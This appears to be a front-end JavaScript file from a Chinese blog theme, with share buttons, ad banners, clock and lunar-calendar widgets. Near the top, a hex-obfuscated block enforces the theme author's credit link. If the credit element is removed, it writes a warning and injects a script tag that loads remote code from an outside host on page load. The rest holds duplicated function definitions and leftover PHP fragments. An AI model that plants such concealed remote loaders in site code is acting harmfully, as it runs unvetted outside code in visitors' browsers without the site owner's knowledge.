$(document).ready(function(){
$("#flash").responsiveSlides({
   auto: true,
   pager: true,
   speed: 800,
});
})

$(window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"])["\x72\x65\x61\x64\x79"](function(){$("\x23\x78\x6a")["\x65\x61\x63\x68"](function(){$(this)["\x61\x74\x74\x72"]("\x68\x72\x65\x66", "\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x68\x75\x79\x6f\x6e\x67\x2e\x6e\x65\x74");$("\x23\x78\x6a")["\x68\x74\x6d\x6c"]("\u820d\u529b\u535a\u5ba2")})});function xj0(WHgsu_p1){var TMLXKQ2 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64"](WHgsu_p1);if(TMLXKQ2){return true}else{return false}};$(function(){if(!xj0("\x78\x6a")) window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65\x6c\x6e"]("\x3c\x64\x69\x76 \x73\x74\x79\x6c\x65\x3d\"\x6d\x61\x78\x2d\x77\x69\x64\x74\x68\x3a\x31\x30\x30\x30\x70\x78\x3b \x6d\x61\x72\x67\x69\x6e\x3a\x31\x30\x30\x70\x78 \x61\x75\x74\x6f\x3b\"\x3e\u4fee\u6539\u6216\u5220\u9664\u6a21\u677f\u4f5c\u8005\u4fe1\u606f\u624d\u4f1a\u51fa\u73b0\u6b64\u9875\u9762\uff0c\u8bf7\u52ff\u5220\u9664\u6216\u4fee\u6539\uff0c\u4e0d\u8981\u95ee\u6211\u600e\u4e48\u53bb\u6389\uff0c\u4e0d\u7528\u5c31\u81ea\u7136\u53bb\u6389\u4e86\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\"\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\" \x73\x72\x63\x3d\"\x68\x74\x74\x70\x3a\x2f\x2f\x73\x68\x65\x6c\x69\x2e\x73\x69\x6e\x61\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x6a\x73\x2d\x73\x68\x65\x6c\x69\x2f\x6b\x73\x61\x6e\x5f\x74\x62\x2e\x6a\x73\"\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x2f\x64\x69\x76\x3e");})

// 百度分享代码
function bdfx() {
document.writeln("<div class=\"bdsharebuttonbox\">");
document.writeln("<a title=\"分享到QQ空间\" href=\"#\" class=\"bds_qzone\" data-cmd=\"qzone\"></a>");
document.writeln("<a title=\"分享到新浪微博\" href=\"#\" class=\"bds_tsina\" data-cmd=\"tsina\"></a>");
document.writeln("<a title=\"分享到腾讯微博\" href=\"#\" class=\"bds_tqq\" data-cmd=\"tqq\"></a>");
document.writeln("<a title=\"分享到搜狐微博\" href=\"#\" class=\"bds_tsohu\" data-cmd=\"tsohu\"></a>");
document.writeln("<a title=\"分享到网易微博\" href=\"#\" class=\"bds_t163\" data-cmd=\"t163\"></a>");
document.writeln("<a title=\"分享到微信\" href=\"#\" class=\"bds_weixin\" data-cmd=\"weixin\"></a>");
document.writeln("<a title=\"分享到百度空间\" href=\"#\" class=\"bds_hi\" data-cmd=\"hi\"></a>");
document.writeln("<a title=\"分享到人人网\" href=\"#\" class=\"bds_renren\" data-cmd=\"renren\"></a>");
document.writeln("<a title=\"分享到美丽说\" href=\"#\" class=\"bds_meilishuo\" data-cmd=\"meilishuo\"></a>");
document.writeln("<a title=\"分享到天涯社区\" href=\"#\" class=\"bds_ty\" data-cmd=\"ty\"></a>");
document.writeln("<a title=\"分享到腾讯朋友\" href=\"#\" class=\"bds_tqf\" data-cmd=\"tqf\"></a>");
document.writeln("<a href=\"#\" class=\"bds_more\" data-cmd=\"more\"></a>");
document.writeln("</div>");
document.writeln("<script>window._bd_share_config={\"common\":{\"bdSnsKey\":{},\"bdText\":\"\",\"bdMini\":\"2\",\"bdMiniList\":false,\"bdPic\":\"\",\"bdStyle\":\"0\",\"bdSize\":\"24\"},\"share\":{}};with(document)0[(getElementsByTagName(\'head\')[0]||body).appendChild(createElement(\'script\')).src=\'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=\'+~(-new Date()/36e5)];</script>");
}

function left_gg() {
document.writeln("<a href=\"http://www.west263.com?ReferenceID=812373\" target=\"_blank\"><img src=\"http://www.west263.com/vcp/vcp_img/free6/F/300x250_F.jpg\"></a>");
}
function log_gg() {
document.writeln("<a href=\"http://www.west263.com?ReferenceID=812373\" target=\"_blank\"><img src=\"http://www.west263.com/vcp/vcp_img/free6/F/728x90_F.jpg\"\"></a>");
}

//时间格式：今天是xx年x月x日
function sjdm1() {
var day=""; 
var month=""; 
var year=""; 
mydate=new Date(); 
mymonth=mydate.getMonth()+1; 
myday= mydate.getDate(); 
myyear= mydate.getYear(); 
year=(myyear > 200) ? myyear : 1900 + myyear; 
document.write(year+"年"+mymonth+"月"+myday+"日")
}

function sjdm2() {
var urodz= new Date("1/31/2014");
var s="<font style=\"font-size:18px;color:#FF0000;font-weight:bold\">春节</font>";
var now = new Date();
var ile = urodz.getTime() - now.getTime();
var dni = Math.floor(ile / (1000 * 60 * 60 * 24))+1;
if (dni > 1)
document.write("还有<font style=\"font-size:18px;color:#FF0000;font-weight:bold\">"+dni +"</font>天"+"就是"+s+"啦！")
else if (dni == 1)
document.write("<font style=\"font-size:18px;color:#FF0000;font-weight:bold\">除夕</font>，明天就是"+s+"啦！")
else if (dni == 0)
document.write("农历正月初一("+s+")")
else
document.write("")
}


// 留言链接
function lyurl1() {
document.writeln("<a href=\"\'.$comment[\'url\'].\'\" target=\"_blank\" rel=\"nofollow\">\'.$comment[\'poster\'].\'</a>");
}


//网址导航
function daohang(){
document.writeln("<script charset=\"utf-8\" src=\"http://daohang.shuyong.net/daohang.js\" type=\"text/javascript\"></script>");
}

//时间格式：今天是xx年x月x日
function sjdm1() {
var day=""; 
var month=""; 
var year=""; 
mydate=new Date(); 
mymonth=mydate.getMonth()+1; 
myday= mydate.getDate(); 
myyear= mydate.getYear(); 
year=(myyear > 200) ? myyear : 1900 + myyear; 
document.write(year+"年"+mymonth+"月"+myday+"日")
}

//时间格式：今天是xx年x月x日
function sjdm2() {
var tags_before_clock = ""
var tags_after_clock = ""
if(navigator.appName == "Netscape") {
document.write('<layer id="clock"></layer>');
}
if (navigator.appVersion.indexOf("MSIE") != -1){
document.write('<span id="clock"></span>');
}
function showclock()
{ 
var date = new Date();
var hour = date.getHours();
var min = date.getMinutes(); 
var sec = date.getSeconds();
var col = ":";
var spc = " ";
var apm; 
if ( hour >12 ) 
{ 
apm="P.M.";
hour=hour-12;
}
else 
{
apm="A.M.";
}
if (hour == 0) hour=12;
if (min<=9) min="0"+min;
if (sec<=9) sec="0"+sec;
if(navigator.appName == "Netscape") 
{
document.clock.document.write(tags_before_clock
+hour+col+min+col+sec+spc+tags_after_clock);
document.clock.document.close();
}
if (navigator.appVersion.indexOf("MSIE") != -1)
{
clock.innerHTML = tags_before_clock+hour
+col+min+col+sec;
}
} 
setInterval("showclock()",1000);
}

function sjdm1() {
<!--
var lunarInfo=new Array(
0x04bd8,0x04ae0,0x0a570,0x054d5,0x0d260,0x0d950,0x16554,0x056a0,0x09ad0,0x055d2,
0x04ae0,0x0a5b6,0x0a4d0,0x0d250,0x1d255,0x0b540,0x0d6a0,0x0ada2,0x095b0,0x14977,
0x04970,0x0a4b0,0x0b4b5,0x06a50,0x06d40,0x1ab54,0x02b60,0x09570,0x052f2,0x04970,
0x06566,0x0d4a0,0x0ea50,0x06e95,0x05ad0,0x02b60,0x186e3,0x092e0,0x1c8d7,0x0c950,
0x0d4a0,0x1d8a6,0x0b550,0x056a0,0x1a5b4,0x025d0,0x092d0,0x0d2b2,0x0a950,0x0b557,
0x06ca0,0x0b550,0x15355,0x04da0,0x0a5d0,0x14573,0x052d0,0x0a9a8,0x0e950,0x06aa0,
0x0aea6,0x0ab50,0x04b60,0x0aae4,0x0a570,0x05260,0x0f263,0x0d950,0x05b57,0x056a0,
0x096d0,0x04dd5,0x04ad0,0x0a4d0,0x0d4d4,0x0d250,0x0d558,0x0b540,0x0b5a0,0x195a6,

0x095b0,0x049b0,0x0a974,0x0a4b0,0x0b27a,0x06a50,0x06d40,0x0af46,0x0ab60,0x09570,
0x04af5,0x04970,0x064b0,0x074a3,0x0ea50,0x06b58,0x055c0,0x0ab60,0x096d5,0x092e0,
0x0c960,0x0d954,0x0d4a0,0x0da50,0x07552,0x056a0,0x0abb7,0x025d0,0x092d0,0x0cab5,
0x0a950,0x0b4a0,0x0baa4,0x0ad50,0x055d9,0x04ba0,0x0a5b0,0x15176,0x052b0,0x0a930,
0x07954,0x06aa0,0x0ad50,0x05b52,0x04b60,0x0a6e6,0x0a4e0,0x0d260,0x0ea65,0x0d530,
0x05aa0,0x076a3,0x096d0,0x04bd7,0x04ad0,0x0a4d0,0x1d0b6,0x0d250,0x0d520,0x0dd45,
0x0b5a0,0x056d0,0x055b2,0x049b0,0x0a577,0x0a4b0,0x0aa50,0x1b255,0x06d20,0x0ada0)
var Animals=new Array("鼠","牛","虎","兔","龙","蛇","马","羊","猴","鸡","狗","金猪");
var Gan=new Array("甲","乙","丙","丁","戊","己","庚","辛","壬","癸");
var Zhi=new Array("子","丑","寅","卯","辰","巳","午","未","申","酉","戌","亥");
var now = new Date();
var SY = now.getFullYear(); 
var SM = now.getMonth();
var SD = now.getDate();
 
//==== 传入 offset 传回干支, 0=甲子
function cyclical(num) { return(Gan[num%10]+Zhi[num%12])}

//==== 传回农历 y年的总天数
function lYearDays(y) {
   var i, sum = 348
   for(i=0x8000; i>0x8; i>>=1) sum += (lunarInfo[y-1900] & i)? 1: 0
   return(sum+leapDays(y))
}

//==== 传回农历 y年闰月的天数
function leapDays(y) {
   if(leapMonth(y))  return((lunarInfo[y-1900] & 0x10000)? 30: 29)
   else return(0)
}

//==== 传回农历 y年闰哪个月 1-12 , 没闰传回 0
function leapMonth(y) { return(lunarInfo[y-1900] & 0xf)}

//====================================== 传回农历 y年m月的总天数
function monthDays(y,m) { return( (lunarInfo[y-1900] & (0x10000>>m))? 30: 29 )}

//==== 算出农历, 传入日期物件, 传回农历日期物件
//     该物件属性有 .year .month .day .isLeap .yearCyl .dayCyl .monCyl
function Lunar(objDate) {
   var i, leap=0, temp=0
   var baseDate = new Date(1900,0,31)
   var offset   = (objDate - baseDate)/86400000

   this.dayCyl = offset + 40
   this.monCyl = 14

   for(i=1900; i<2050 && offset>0; i++) {
      temp = lYearDays(i)
      offset -= temp
      this.monCyl += 12
   }
   if(offset<0) {
      offset += temp;
      i--;
      this.monCyl -= 12
   }

   this.year = i
   this.yearCyl = i-1864

   leap = leapMonth(i) //闰哪个月
   this.isLeap = false

   for(i=1; i<13 && offset>0; i++) {
      //闰月
      if(leap>0 && i==(leap+1) && this.isLeap==false)
         { --i; this.isLeap = true; temp = leapDays(this.year); }
      else
         { temp = monthDays(this.year, i); }

      //解除闰月
      if(this.isLeap==true && i==(leap+1)) this.isLeap = false

      offset -= temp
      if(this.isLeap == false) this.monCyl ++
   }

   if(offset==0 && leap>0 && i==leap+1)
      if(this.isLeap)
         { this.isLeap = false; }
      else
         { this.isLeap = true; --i; --this.monCyl;}

   if(offset<0){ offset += temp; --i; --this.monCyl; }

   this.month = i
   this.day = offset + 1
}

 function YYMMDD(){ 
    var cl = '<font color="" style="font-size:9pt;">'; 
    if (now.getDay() == 0) cl = '<font color="" style="font-size:9pt;">'; 
    if (now.getDay() == 6) cl = '<font color="" style="font-size:9pt;">';
    return(cl+SY+'年'+(SM+1)+'月'+SD+'日</font>'); 
 }
 function weekday(){ 
    var day = new Array("<font color='red'>星期日</font>","星期一","星期二","星期三","星期四","星期五","星期六");
    if (now.getDay() == 0) cl = '<font color="" style="font-size:9pt;">';
    if (now.getDay() == 6) cl = '<font color="" style="font-size:9pt;"">'; 
    return(day[now.getDay()]); 
 }
//==== 中文日期
function cDay(m,d){
 var nStr1 = new Array('日','一','二','三','四','五','六','七','八','九','十');
 var nStr2 = new Array('初','十','廿','卅','　');
 var s;
 if (m>10){s = '十'+nStr1[m-10]} else {s = nStr1[m]} s += '月'
 switch (d) {
  case 10:s += '初十'; break;
  case 20:s += '二十'; break;
  case 30:s += '三十'; break;
  default:s += nStr2[Math.floor(d/10)]; s += nStr1[d%10];
 }
 return(s);
}
 function solarDay1(){
    var sDObj = new Date(SY,SM,SD);
    var lDObj = new Lunar(sDObj);
    var tt = '【'+Animals[(SY-4)%12]+'】'+cyclical(lDObj.monCyl)+'月 '+cyclical(lDObj.dayCyl++)+'日' ;
    return(tt);
 }
 function solarDay2(){
    var sDObj = new Date(SY,SM,SD);
    var lDObj = new Lunar(sDObj);
    var cl = '<font color="" style="font-size:9pt;">'; 
    //农历BB'+(cld[d].isLeap?'闰 ':' ')+cld[d].lMonth+' 月 '+cld[d].lDay+' 日
    var tt = cyclical(SY-1900+36)+'年 '+cDay(lDObj.month,lDObj.day);
    return(cl+tt+'</font>');
 }document.write("");
 function solarDay3(){
var sTermInfo = new Array(0,21208,42467,63836,85337,107014,128867,150921,173149,195551,218072,240693,263343,285989,308563,331033,353350,375494,397447,419210,440795,462224,483532,504758)
var solarTerm = new Array("小寒","大寒","立春","雨水","惊蛰","春分","清明","谷雨","立夏","小满","芒种","夏至","小暑","大暑","立秋","处暑","白露","秋分","寒露","霜降","立冬","小雪","大雪","冬至")
var lFtv = new Array("0101*春节","0115 元宵节","0505 端午节","0707 七夕情人节","0715 中元节","0815 中秋节","0909 重阳节","1208 腊八节","1224 小年","0100*除夕")
var sFtv = new Array("0101*元旦","0214 情人节","0308 妇女节","0312 植树节","0315 消费者权益日",
"0401 愚人节","0501 劳动节","0504 青年节","0512 护士节","0601 儿童节","0628 老Y发布纪念日","0701 建党节 香港回归纪念",
"0801 建军节","0808 父亲节","0909 毛泽东逝世纪念","0910 教师节","0928 小侄女生日","1001*国庆节",
"1006 老人节","1001 国庆节","1024 联合国日","1112 孙中山诞辰","1220 澳门回归纪念","1225 圣诞节","1226 毛泽东诞辰")

  var sDObj = new Date(SY,SM,SD);
  var lDObj = new Lunar(sDObj);
  var lDPOS = new Array(3)
  var festival='',solarTerms='',solarFestival='',lunarFestival='',tmp1,tmp2;
  //农历节日 
  for(i in lFtv)
  if(lFtv[i].match(/^(\d{2})(.{2})([\s\*])(.+)$/)) {
   tmp1=Number(RegExp.$1)-lDObj.month
   tmp2=Number(RegExp.$2)-lDObj.day
   if(tmp1==0 && tmp2==0) lunarFestival=RegExp.$4 
  }
  //国历节日
  for(i in sFtv)
  if(sFtv[i].match(/^(\d{2})(\d{2})([\s\*])(.+)$/)){
   tmp1=Number(RegExp.$1)-(SM+1)
   tmp2=Number(RegExp.$2)-SD
   if(tmp1==0 && tmp2==0) solarFestival = RegExp.$4 
  }
  //节气
  tmp1 = new Date((31556925974.7*(SY-1900)+sTermInfo[SM*2+1]*60000)+Date.UTC(1900,0,6,2,5))
  tmp2 = tmp1.getUTCDate()
  if (tmp2==SD) solarTerms = solarTerm[SM*2+1]  
  tmp1 = new Date((31556925974.7*(SY-1900)+sTermInfo[SM*2]*60000)+Date.UTC(1900,0,6,2,5))
  tmp2= tmp1.getUTCDate()
  if (tmp2==SD) solarTerms = solarTerm[SM*2] 

  if(solarTerms == '' && solarFestival == '' && lunarFestival == '')
    festival = '';
  else
    festival = '<font color="#FF0000" style="font-size:9pt;">'+solarTerms + ' ' + solarFestival + ' ' + lunarFestival+'</font>';
         
  var cl = '<font color="" style="font-size:9pt;">';
  return(cl+festival+'</font>');
 }
 function setCalendar(){
 
    document.write(YYMMDD()+'&nbsp;'+weekday() + "&nbsp;");
    //document.write(" <span style=\"font-size:9pt;color:\">农历：</span>" );
    document.write(" " + solarDay2());
    document.write(" " + solarDay3());
    document.write(" " + solarDay1());
 }

 setCalendar();
//-->

}
